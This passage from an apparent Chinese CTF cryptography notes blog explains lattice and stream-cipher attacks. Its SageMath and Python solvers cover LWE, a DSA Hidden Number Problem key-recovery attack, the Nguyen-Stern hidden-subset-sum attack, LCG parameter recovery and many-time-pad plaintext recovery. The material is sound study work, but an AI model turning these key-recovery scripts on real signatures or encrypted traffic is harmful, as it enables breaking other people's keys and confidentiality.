A_values[x][y]lattice = IntegerLattice(A, lll_reduce=True)print(&quot;LLL done&quot;)gram = lattice.reduced_basis.gram_schmidt()[0]target = vector(ZZ, b_values)res = Babai_closest_vector(lattice.reduced_basis, gram, target)print(&quot;Closest Vector: &#123;&#125;&quot;.format(res))R = IntegerModRing(q)M = Matrix(R, A_values)ingredients = M.solve_right(res)print(&quot;Ingredients: &#123;&#125;&quot;.format(ingredients))for row, b in zip(A_values, b_values): effect = sum(starmap(mul, zip(map(int, ingredients), row))) % q assert(abs(b - effect) &lt; 2 ** 37)print(&quot;ok&quot;) 利用Embedding Technique构造一个Embedding Lattice，也可以解SVP。 1234567891011121314151617181920212223242526272829303132333435363738394041# SageDEBUG = Falsem = 44n = 55p = 2^5q = 2^10def errorV(): return vector(ZZ, [1 - randrange(3) for _ in range(n)])def vecM(): return vector(ZZ, [p//2 - randrange(p) for _ in range(m)])def vecN(): return vector(ZZ, [p//2 - randrange(p) for _ in range(n)])def matrixMn(): mt = matrix(ZZ, [[q//2 - randrange(q) for _ in range(n)] for _ in range(m)]) return mtA = matrixMn()e = errorV()x = vecM()b = x*A+eif DEBUG: print(&#x27;A = \\n%s&#x27; % A) print(&#x27;x = %s&#x27; % x) print(&#x27;b = %s&#x27; % b)print(&#x27;e = %s&#x27; % e)z = matrix(ZZ, [0 for _ in range(m)]).transpose()beta = matrix(ZZ, [1])T = block_matrix([[A, z], [matrix(b), beta]])if DEBUG: print(&#x27;T = \\n%s&#x27; % T)print(&#x27;-----&#x27;)L = T.LLL()print(L[0])print(L[0][:n] == e) 12345678910111213141516171819# Sageimport res2n=lambda x: [int(x) for x in re.findall(r&quot;\\-?\\d+\\.?\\d*&quot;,x)]f=open(&quot;./enc.out&quot;,&quot;r&quot;).readlines()m = 66n = 200p = 5q = 2^20B = [s2n(f[i]) for i in range(m)]A = [s2n(f[i+66]) for i in range(m)]C = [s2n(f[i+132]) for i in range(m)]b= list(matrix(ZZ,s2n(f[-1])))m=A+B+C+bM = matrix(ZZ,m)L = M.LLL()print(L[0])res=M.solve_left(L[0])for i in res[:-1]: print(chr(abs(i)),end=&quot;&quot;) 参考 初探全同态加密之二：格密码学与LWE问题 祥云杯 2020 - easy matrix Aero CTF 2020 - Magic II XNUCA2020 - diamond 2022 DASCTF 7月赋能赛 - LWE? ​ 环LWE（RLWE）环LWE问题是LWE问题在环上的版本，不同的是 $A$ 和 $s$ 的选取是在多项式环。 多项式环 $R_q = \\mathbb{Z_q}[x]/f(x)$，表示每次计算后都要对多项式系数模 $q$，对多项式模 $f(x)$​​。它其中的每个元素都是一个多项式，每一次操作都相当于对多个元素进行操作，也就是能够一次加密多个比特的明文，对比LWE每次仅能对一个比特操作来说能够大大提高效率满足实际需要。 对于 $B=AS+E$，给出 $A,B$，$E$ 是随机生成一个小噪声多项式，$S$ 的系数在模 $p$ 下很小，要求还原 $S$​。 假设多项式 $a$ 和多项式 $b$ 模多项式 $v$，要计算得到的多项式 $c$，其中 $v$ 是 $n$ 次。 记多项式为： $a = (a_0,a_1,a_2,a_3,…a_{n-1})$ $b = (b_0,b_1,b_2,b_3,…b_{n-1})$ $v = (v_0,v_1,v_2,v_3,…v_{n-1},1)$​ （ 默认首一多项式） $c = (c_0,c_1,c_2,c_3,…c_{n-1})$ 将将商环下的多项式乘法拆分成两步，并分别用矩阵乘法表示： $a$ 和 $b$ 相乘，得到 $d$ $d$ 模 $v$，得到 $c$ 然后将两步矩阵相乘，就得到最终矩阵——商环下多项式乘法的表示矩阵。 其中 $d$ 是一个最高次项可以达到 $2n-2$​ 次的一个多项式，因此可以写作： $d = (d_0,d_1,d_2,d_3,…d_{n-1},d_n,…,d_{2n-2})$​ $a$ 和 $b$ 相乘，得到 $d$​ 将所有能得到这个次数的系数乘积求和即可。 $(a_0,a_1,a_2,…a_{n-1})_{1\\times n}\\left( \\begin{matrix} b_0 &amp;b_1 &amp;b_2 &amp;\\cdots &amp;b_{n-1}&amp;&amp;\\\\ &amp;b_0 &amp;b_1 &amp;\\cdots &amp;b_{n-2}&amp;b_{n-1}&amp;\\\\ &amp;&amp;b_0 &amp;\\cdots &amp;b_{n-3}&amp;b_{n-2}&amp;b_{n-1}\\\\ &amp;&amp;&amp;\\ddots &amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots\\\\ &amp;&amp;&amp;&amp;b_0&amp;b_1&amp;b_2&amp;\\cdots&amp;b_{n-1}\\\\ \\end{matrix} \\right) _{n\\times (2n-1)} = (d_0,d_1,d_2,d_3,…d_{n-1},d_n,…,d_{2n-2})_{1\\times (2n-1)}$​ $d$ 模 $v$，得到 $c$ 首先对于 $d$ 中前 $n$ 项来说（ $0$ 到 $n-1$ 次项），很容易表示最终的向量 $c$，由于次数低，不需要模多项式，所以只需要将对应数值加到 $c$​ 中对应项中就可以，也就是造一个单位矩阵即可。而较难处理的是 $d$ 中超过了 $n-1$ 次的项，因为要进行模 $v$ 的操作。 构造模多项式中的同余方程： $x^{n} = -(v_{n-1}x^{n-1}+v_{n-2}x^{n-2}+…+v_{2}x^{2}+v_{1}x^{1}+v_0) \\bmod v$ 也就有： $x^{n+i} = -(v_{n-1}x^{n-1+i}+v_{n-2}x^{n-2+i}+…+v_{2}x^{2+i}+v_{1}x^{1+i}+v_0x^i) \\bmod v$​ 而又因为 $d$ 中最高也就只有 $2n-2$ 次项，所以 $i \\in \\{0,1,2,…,n-3,n-2\\}$​。 由于高次项会存在多次使用同余方程降次，因此需要从 $i=0$ 开始，逐步将 $x^{n+i}$ 均转化成一个次数在 $0$ 到 $n-1$ 的多项式并求出系数，加到最终多项式 $c$ 的对应项的系数中。 $i=0$ 时，直接利用前面的同余方程就可以得到每个次数的项前需要加的系数： $x^{n} = -(v_{n-1}x^{n-1}+v_{n-2}x^{n-2}+…+v_{2}x^{2}+v_{1}x^{1}+v_0) \\bmod v$ 而 $i=1$ 时，右侧的同余方程又会出现需要降次的 $x^n$​ 次方项，如下： $x^{n+1} = -(v_{n-1}{\\color{red}{x^{n}}}+v_{n-2}x^{n-1}+…+v_{2}x^{3}+v_{1}x^{2}+v_0x) \\bmod v$ 把刚才求过的 $n$ 次项降次后得到的系数代入，有： $x^{n+1} = -(v_{n-1}{\\color{red}{(-(v_{n-1}x^{n-1}+v_{n-2}x^{n-2}+…+v_{2}x^{2}+v_{1}x^{1}+v_0)}}+v_{n-2}x^{n-1}+…+v_{2}x^{3}+v_{1}x^{2}+v_0x) \\bmod v$ 然后展开运算出各项系数即可。 以此类推，代入已经算出的式子并展开计算，一直迭代到： $x^{n+n-2} = -(v_{n-1}{\\color{red}{x^{n+n-3}}}+v_{n-2}{\\color{red}{x^{n+n-4}}}+…+v_{2}{\\color{red}{x^{n}}}+v_{1}x^{n-1}+v_0x^{n-2}) \\bmod v$ 而要构造矩阵，只需要将 $d$ 中的大于等于 $n$ 次方的每一项系数乘以刚才对应展开形式中的对应项系数，就可以得到矩阵中对应的行，然后接在单位矩阵下即可。这一步的矩阵为： $\\left( \\begin{matrix} 1\\\\ &amp;1\\\\ &amp;&amp;1\\\\ &amp;&amp;&amp;\\ddots\\\\ &amp;&amp;&amp;&amp;1\\\\ r_0&amp;r_1&amp;r_2&amp;\\cdots&amp;r_{n-1}\\\\ s_0&amp;s_1&amp;s_2&amp;\\cdots&amp;s_{n-1}\\\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\\\ t_0&amp;t_1&amp;t_2&amp;\\cdots&amp;t_{n-1}\\\\ \\end{matrix} \\right) _{(2n-1)\\times n}$ 对这一步的矩阵有： $(d_0,d_1,d_2,d_3,…d_{n-1},d_n,…,d_{2n-2})_{1\\times (2n-1)}\\left( \\begin{matrix} 1\\\\ &amp;1\\\\ &amp;&amp;1\\\\ &amp;&amp;&amp;\\ddots\\\\ &amp;&amp;&amp;&amp;1\\\\ r_0&amp;r_1&amp;r_2&amp;\\cdots&amp;r_{n-1}\\\\ s_0&amp;s_1&amp;s_2&amp;\\cdots&amp;s_{n-1}\\\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\\\ t_0&amp;t_1&amp;t_2&amp;\\cdots&amp;t_{n-1}\\\\ \\end{matrix} \\right) _{(2n-1)\\times n} =(c_0,c_1,c_2,c_3,…c_{n-1})_{1\\times n}$ 综合表示 将两个矩阵相乘，得到一般意义下的多项式乘法卷积矩阵： $L=\\left( \\begin{matrix} b_0 &amp;b_1 &amp;b_2 &amp;\\cdots &amp;b_{n-1}&amp;&amp;\\\\ &amp;b_0 &amp;b_1 &amp;\\cdots &amp;b_{n-2}&amp;b_{n-1}&amp;\\\\ &amp;&amp;b_0 &amp;\\cdots &amp;b_{n-3}&amp;b_{n-2}&amp;b_{n-1}\\\\ &amp;&amp;&amp;\\ddots &amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots\\\\ &amp;&amp;&amp;&amp;b_0&amp;b_1&amp;b_2&amp;\\cdots&amp;b_{n-1}\\\\ \\end{matrix} \\right) _{n\\times (2n-1)} \\left( \\begin{matrix} 1\\\\ &amp;1\\\\ &amp;&amp;1\\\\ &amp;&amp;&amp;\\ddots\\\\ &amp;&amp;&amp;&amp;1\\\\ r_0&amp;r_1&amp;r_2&amp;\\cdots&amp;r_{n-1}\\\\ s_0&amp;s_1&amp;s_2&amp;\\cdots&amp;s_{n-1}\\\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\\\ t_0&amp;t_1&amp;t_2&amp;\\cdots&amp;t_{n-1}\\\\ \\end{matrix} \\right) _{(2n-1)\\times n}$ 此时有： $(a_0,a_1,a_2,…a_{n-1})L= (c_0,c_1,c_2,c_3,…c_{n-1})$ 对 $L$ 规约即可得到需要的向量。 参考： NSSRound#18 - New Year Ring1/2/3 ​ 隐藏数问题（HNP / Hidden Number Problem）由DSA签名中各参数的关系： $r \\equiv g^k \\pmod q$ $s \\equiv k^{-1}(H(m)+xr) \\equiv q$ 可得每轮临时密钥与签名、明文的关系： $k_i \\equiv s_i^{-1}r_i \\cdot x+s_i^{-1}H(m) \\pmod q$ $k_i \\equiv A_ix+B_i \\pmod q$ $k_i = A_ix+B_i+l_iq$ 其中 $k_i$ 就是每次使用的临时密钥，$A_i = s_i^{-1}r,B_i = s_i^{-1}H(m)$。 构建格： $M =\\begin{bmatrix}q &amp; &amp; &amp; &amp; &amp; &amp; \\newline&amp; q &amp; &amp; &amp; &amp; &amp; \\newline&amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline&amp; &amp; &amp; q &amp; &amp; &amp; \\newlineA_1&amp;A_2&amp;\\dots &amp; A_t&amp;K/q&amp; &amp; \\newlineB_1&amp;B_2&amp;\\dots &amp; B_t&amp; &amp; K &amp; \\newline\\end{bmatrix}$ （其中 $K$ 是 $k$ 的上界，例如 $k$ 的位数小于等于121时，那么 $K=2^{122}$） 不难发现，存在一个 $M$ 的整系数线性组合 $v$，可以得到我们想要的 $v_k$。 $vM =\\begin{bmatrix}l_1 &amp; l_2 &amp; \\cdots &amp; l_t &amp; x &amp; 1\\end{bmatrix}\\begin{bmatrix}q &amp; &amp; &amp; &amp; &amp; &amp; \\newline&amp; q &amp; &amp; &amp; &amp; &amp; \\newline&amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline&amp; &amp; &amp; q &amp; &amp; &amp; \\newlineA_1&amp;A_2&amp;\\dots &amp; A_t&amp;K/q&amp; &amp; \\newlineB_1&amp;B_2&amp;\\dots &amp; B_t&amp; &amp; K &amp; \\newline\\end{bmatrix} = \\begin{bmatrix}k_1 &amp;k_2 &amp;\\cdots &amp;k_t &amp;Kx/q &amp;K\\end{bmatrix}= v_k$ 因此 $v_k$ 即为 $M$ 上的一个格点，且长度很短，可以用LLL算法求出。 注：有另一个短向量 $v=(0,0,⋯,K,0)$ 也在格上，且这个短向量比 $(k_1, k_2, \\cdots, k_t, Kx/n, K)$ 还要短。此外，多次测试发现，$v_k$ 总会出现在LLL后的第二行。 1234567891011121314151617181920212223242526272829303132import jsont = 40# Load dataf = open(&quot;data&quot;, &quot;r&quot;)(q, Hm_s, r_s, s_s) = json.load(f)# Calculate A &amp; BA = []B = []for r, s, Hm in zip(r_s, s_s, Hm_s): A.append( ZZ( (inverse_mod(s, q)*r) % q ) ) B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) )# Construct LatticeK = 2^122 # ki &lt; 2^122X = q * identity_matrix(QQ, t) # t * tZ = matrix(QQ, [0] * t + [K/q] + [0]).transpose() # t+1 columnZ2 = matrix(QQ, [0] * (t+1) + [K]).transpose() # t+2 columnY = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * tY = block_matrix([[Y, Z, Z2]])# Find short vectorY = Y.LLL()# checkk0 = ZZ(Y[1, 0] % q)x = ZZ(Y[1, -2] / (K/q) % q)assert(k0 == (A[0]*x + B[0]) % q)print(x) 参考 The Dark Side of the Hidden Number Problem: Lattice Attacks on DSA [HNP] 一类基于各种DSA的HNP问题求解 NPUCTF 2020 - babyLCG RCTF 2022 - IS_THIS_LCG ​ 隐子集和问题（HSSP / Hidden Subset Sum Problem）$w=vG$，其中 $w,v$ 为 $\\text{GF}(p)$ 上的向量，$G$ 为01矩阵（$g_{ij} \\in \\{ 0,1 \\}$），已知 $w$，恢复矩阵 $G$。 求解算法 Nguyen-Stern Algorithm，使用 orthogonal lattice 实现。 参考： HSSP与正交格学习笔记 格密码分析：正交格攻击 A Polynomial-Time Algorithm for Solving the Hidden Subset Sum Problem AIS3 EOF CTF Quals 2021 - notPRNG Zer0pts CTF 2022 - Karen solving_hssp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125from Crypto.Util.number import *n = 60m = 330p = ...w = ...MM = ...e = 0x10001MM = matrix(GF(2), MM)def allpmones(v): return len([vj for vj in v if vj in [-1, 0, 1]]) == len(v)# We generate the lattice of vectors orthogonal to b modulo x0def orthoLattice(b, x0): m = b.length() M = Matrix(ZZ, m, m) for i in range(1, m): M[i, i] = 1 M[1:m, 0] = -b[1:m] * inverse_mod(b[0], x0) M[0, 0] = x0 for i in range(1, m): M[i, 0] = mod(M[i, 0], x0) return Mdef allones(v): if len([vj for vj in v if vj in [0, 1]]) == len(v): return v if len([vj for vj in v if vj in [0, -1]]) == len(v): return -v return Nonedef recoverBinary(M5): lv = [allones(vi) for vi in M5 if allones(vi)] n = M5.nrows() for v in lv: for i in range(n): nv = allones(M5[i] - v) if nv and nv not in lv: lv.append(nv) nv = allones(M5[i] + v) if nv and nv not in lv: lv.append(nv) return Matrix(lv)def kernelLLL(M): n = M.nrows() m = M.ncols() if m &lt; 2 * n: return M.right_kernel().matrix() K = 2 ^ (m // 2) * M.height() MB = Matrix(ZZ, m + n, m) MB[:n] = K * M MB[n:] = identity_matrix(m) MB2 = MB.T.LLL().T assert MB2[:n, : m - n] == 0 Ke = MB2[n:, : m - n].T return Kedef attack(m, n, p, h): # This is the Nguyen-Stern attack, based on BKZ in the second step print(&quot;n =&quot;, n, &quot;m =&quot;, m) iota = 0.035 nx0 = int(2 * iota * n ^ 2 + n * log(n, 2)) print(&quot;nx0 =&quot;, nx0) x0 = p b = vector(h) # only information we get M = orthoLattice(b, x0) t = cputime() M2 = M.LLL() print(&quot;LLL step1: %.1f&quot; % cputime(t)) # assert sum([vi == 0 and 1 or 0 for vi in M2 * X]) == m - n MOrtho = M2[: m - n] print(&quot; log(Height, 2) = &quot;, int(log(MOrtho.height(), 2))) t2 = cputime() ke = kernelLLL(MOrtho) print(&quot; Kernel: %.1f&quot; % cputime(t2)) print(&quot; Total step1: %.1f&quot; % cputime(t)) if n &gt; 170: return beta = 2 tbk = cputime() while beta &lt; n: if beta == 2: M5 = ke.LLL() else: M5 = M5.BKZ(block_size=beta) # we break when we only get vectors with &#123;-1,0,1&#125; components if len([True for v in M5 if allpmones(v)]) == n: break if beta == 2: beta = 10 else: beta += 10 print(&quot;BKZ beta=%d: %.1f&quot; % (beta, cputime(tbk))) t2 = cputime() MB = recoverBinary(M5) print(&quot; Recovery: %.1f&quot; % cputime(t2)) print(&quot; Number of recovered vector = &quot;, MB.nrows()) print(&quot; Number of recovered vector.T = &quot;, MB.ncols()) return MBres = attack(m, n, p, w) ​ 隐线性组合问题（HLCP / Hidden Linear Combination Problem）$w=vG$，其中 $w,v$ 为 $\\text{GF}(p)$ 上的向量，$G$ 为 $0$ 至 $B$ 之间整数值矩阵（$g_{ij} \\in [0,B] \\cap\\mathbb{Z}$），已知 $w$，恢复矩阵 $G$。 参考： Provably Solving the Hidden Subset Sum Problem via Statistical Learning 2022强网杯 - Lattice solving_hssp ​ 方程问题 $aX \\equiv b \\pmod p$ $X$ 是大的数，$a$ 和 $b$ 是小的数，可写成 $aX+kp=b$ 或 $aX-kp=b$，已知 $X$ 和 $p$，求 $a$ 和 $b$。 Wiener’s $\\Big\\vert \\cfrac{X}{p}-\\cfrac{k}{a} \\Big\\vert \\le \\cfrac{1}{2a^2}$ 用连分数方法，用 $\\cfrac{X}{p}$ 求出 $k$ 和 $a$，进而解出 $b$。 Lattices 构造 $(a,k) \\begin{bmatrix} 1 &amp; X \\newline 0 &amp; p\\end{bmatrix} = (a,b)$，记为 $A\\cdot M=B$。 $B$ 有很大概率为 $M$ 里的最短向量，使用LLL算法reduce后可求出最短向量，即解出 $B=(a, b) $。 ​ $a_iX_i \\equiv B \\pmod p$ $B$ 是未知大数，$X$ 是大的数，$a$ 是小的数，已知 $X$ 和 $p$，求 $a$ 和 $B$。如果有多组这样的式子，可以转化成 $aX \\equiv b \\pmod p$ 的情况。 转化为 $a_iB^{-1} \\equiv X_i^{-1} \\pmod p$，消去未知数 $B$，有： $a’=X_1B^{-1} \\bmod p = a_1 \\bmod p$ $b’=X_2B^{-1} \\bmod p = a_2 \\bmod p$ $X’=X_1^{-1}X_2 \\bmod p = a_1^{-1}a_2 \\bmod p$ 即 $a’X’ \\equiv b’ \\pmod p$，对应 $a_iB^{-1} \\equiv X_i^{-1} \\pmod p$ 求解。 ​ $\\sum\\limits_{i=1}^n a_iX_i \\equiv b \\pmod p$ 构造 $(a_1,a_2,\\cdots,a_n,k)\\begin{pmatrix} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; X_1 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; X_2 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; X_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; p \\end{pmatrix}=(a_1,a_2,\\cdots,a_n,b)$，记为 $A\\cdot M=B$。 只要有 $a=\\max(a_i) \\le O(p^{\\frac{1}{n+1}})$ 就可解 $a_i$。 ​ $\\sum\\limits_{i=1}^n a_iX_i \\equiv Y \\pmod p$ $Y$ 是已知大数，背包密码解法。 构造 $(a_1,a_2,\\cdots,a_n,k,-1)\\begin{pmatrix} 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; X_1 \\newline 0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; X_2 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 0 &amp; X_n \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 1&amp; p \\newline 1 &amp; 1 &amp; 1 &amp; \\cdots &amp; 1 &amp; 1&amp; Y\\end{pmatrix}=(a_1-1,a_2-1,\\cdots,a_n-1,k-1,0)$，记为 $A\\cdot M=B$。 注意到 $B$ 的最后一个元素是0，所以如果 $M$ 的最后一列和 $B$ 的最后一个元素同乘一个超大的 $C$ 的话（即 $M$ 和 $B$ 同乘一个对角阵 $D$，$D$ 的对角线上的最右下一个是 $C$，其他是1），$\\det(M)$ 会变大，而 $B$ 则不变。所以如果 $C$ 足够大的话，即可解 $a_i$。 ​ $a_iX_i \\equiv b_i \\pmod {P+s}$ 假设原来的 $p$ 可以拆成 $P+s$，$P$ 已知，$s$ 未知但一定会存在。如RSA中，$\\varphi(N)$ 并不知道，但会知道 $N=\\varphi(N)+[1-(p+q)]$，用类似扩展维纳攻击的方法可以用 $P+s$ 代替 $P$，然后用格的方法做，但需要的 $a$ 和 $b$ 要更小。 对于两组情况： $\\begin{cases} a_1X_1 \\equiv b_1 \\pmod {P+s} \\newline a_2X_2 \\equiv b_2 \\pmod {P+s}\\end{cases}$ 构造 $(k_1k_2,a_1k_2,a_2k_1,a_1a_2)\\begin{pmatrix} 1 &amp; P &amp; 0 &amp; P^2 \\newline 0 &amp; X_1 &amp; X_1 &amp; X_1P \\newline 0 &amp; 0 &amp; -X_2 &amp; X_2P \\newline 0 &amp; 0 &amp; 0 &amp; X_1X_2 \\end{pmatrix}=(k_1k_2,k_2(b_1-sk_2),b_1k_2-b_2k_1,(b_1-k_1s)(b_2-k_2s))$，记为 $A\\cdot M=B$。 ​ $x_i=q_ip+r_i$ $x_i$ 已知，$p$ 为 $\\alpha$ 位，$q_i$ 为 $\\beta$ 位 ，$r_i$ 为 $\\rho$ 位（$\\rho \\lt\\lt \\alpha$），求 $p$。 ACD问题（Approximate Common Divisior Problem）。 构造 $(q_0,q_1,\\cdots,q_t)\\begin{pmatrix} 2^{\\rho} &amp; x_1 &amp; x_2 &amp; \\cdots &amp; x_t \\newline 0 &amp; -x_0 &amp; 0 &amp; \\cdots &amp; 0 \\newline 0 &amp; 0 &amp; -x_0 &amp; \\cdots &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; -x_0\\end{pmatrix}=(q_02^{\\rho},q_0x_1-q_1x_0,\\cdots,q_0x_t-q_tx_0)=(q_02^{\\rho},q_0r_1-q_1r_0,\\cdots,q_0r_t-q_tr_0)$，记为 $A\\cdot M=B$。 使用LLL算法reduce后得到 $q_02^{\\rho}$。 参考： WMCTF 2021 - easylsb 参考：Wiener’s v.s Lattices —— aX=b%p 的方程解法笔记","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"格密码","slug":"格密码","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"流密码","slug":"crypto-流密码","date":"2020-11-06T16:35:40.000Z","updated":"2024-12-21T12:59:18.372Z","comments":true,"path":"2020/11/07/crypto-流密码/","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 在密码学中，流密码（英语：Stream cipher），又译为流加密、资料流加密，是一种对称加密算法，加密和解密双方使用相同伪随机加密数据流（pseudo-random stream）作为密钥，明文数据每次与密钥数据流顺次对应加密，得到密文数据流。实践中数据通常是一个位（bit）并用异或（xor）操作加密。 伪随机密钥流（keystream）由一个随机的种子（seed）通过算法（称为：PRG，pseudo-random generator）得到，$k$ 作为种子，则 $G(k)$ 作为实际使用的密钥进行加密解密工作。为了保证流加密的安全性，PRG必须是不可预测的。该算法解决了对称加密完善保密性（perfect secrecy）的实际操作困难，由于完善保密性要求密钥长度不短于明文长度，故而实际操作存在困难，改由较短数据流通过特定算法得到密钥流。 RC4在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 由美国密码学家罗纳德·李维斯特（Ronald Rivest）在1987年设计的。由于RC4算法存在弱点，2015年2月所发布的 RFC 7465 规定禁止在TLS中使用RC4加密算法。 RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。 由于异或运算的对合性，RC4加密解密使用同一套算法。 算法 KSA 初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。 12345678for i from 0 to 255 S[i] := iendforj := 0for( i=0 ; i&lt;256 ; i++) j := (j + S[i] + key[i mod keylength]) % 256 swap values of S[i] and S[j]endfor PRGA 下面i,j是两个指针。每收到一个字节，就进行while循环。通过一定的算法（(a),(b)）定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒（(c)）。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。 123456789i := 0j := 0while GeneratingOutput: i := (i + 1) mod 256 //a j := (j + S[i]) mod 256 //b swap values of S[i] and S[j] //c k := inputByte ^ S[(S[i] + S[j]) % 256] output Kendwhile 此算法保证每256次循环中S盒的每个元素至少被交换过一次。 1234567891011121314151617181920212223242526N = 256S = [0] * Nkey = &#x27;keykeykey&#x27;Key = [0] * Nt = []for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= S[(S[i] + S[j]) % N]print(t)print(&#x27;&#x27;.join(chr(k) for k in t)) ​ 线性同余生成器 / 线性同余方法（LCG）线性同余方法（LCG）是个产生伪随机数的方法。 它是根据递归公式产生： $ N_{k+1} = (A\\times N_{k}+B){\\pmod {M}} $其中 $A,B,M$ 是产生器设定的常数。 LCG的周期最大为 $M$，但大部分情况都会少于 $M$。要令LCG达到最大周期，应符合以下条件： $B,M$ 互质； $M$ 的所有质因数都能整除 $A-1$； 若 $M$ 是4的倍数，$A-1$ 也是； $A,B,N_{0}$ 都比 $M$ 小； $A,B$ 是正整数。 参考：攻击线性同余生成器(LCG) 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *def cal_LCG_m(seq): t = [] for i in range(1, len(seq)): t.append(seq[i] - seq[i-1]) T = [] for i in range(1, len(t) - 1): T.append(t[i+1] * t[i-1] - t[i] ** 2) m = [] for i in range(len(T)-1): mm = GCD(T[i], T[i+1]) if isPrime(mm): m.append(int(mm)) else: for i in range(1,100): if isPrime(mm // i): mm = mm // i m.append(int(mm)) break return mdef cal_LCG_a_b(seq, m): t = [] for i in range(1, len(seq)): t.append(seq[i] - seq[i-1]) a = inverse(t[0], m) * t[1] % m b = (seq[1] - a * seq[0]) % m return (a, b)seq = []m_poss = cal_LCG_m(seq)print(m_poss)m = m_poss[0]a, b = cal_LCG_a_b(seq, m)print((a, b, m)) ​ 多次一密（Many Time Pad Attack）用同一个密钥去加密多条明文，当密文条数较多时就很容易被攻击，例如Many Time Pad。 这个攻击的原理是 $c_1⊕c_2 = m_1⊕m_2$，而通过 $m_1⊕m_2$ 可以分析出 $m_1⊕m_2$，因此 $m_1⊕m_2$ 不再安全。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#脚本1import Crypto.Util.strxor as xoimport libnum, codecs, numpy as npdef isChr(x): if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True return Falsedef infer(index, pos): if msg[index, pos] != 0: return msg[index, pos] = ord(&#x27; &#x27;) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)def know(index, pos, ch): msg[index, pos] = ord(ch) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)dat = []def getSpace(): for index, x in enumerate(c): res = [xo.strxor(x, y) for y in c if x!=y] f = lambda pos: len(list(filter(isChr, [s[pos] for s in res]))) cnt = [f(pos) for pos in range(len(x))] for pos in range(len(x)): dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat: infer(index, pos)know(10, 21, &#x27;y&#x27;)know(8, 14, &#x27;n&#x27;)print(&#x27;\\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())print(key) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#脚本2#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same 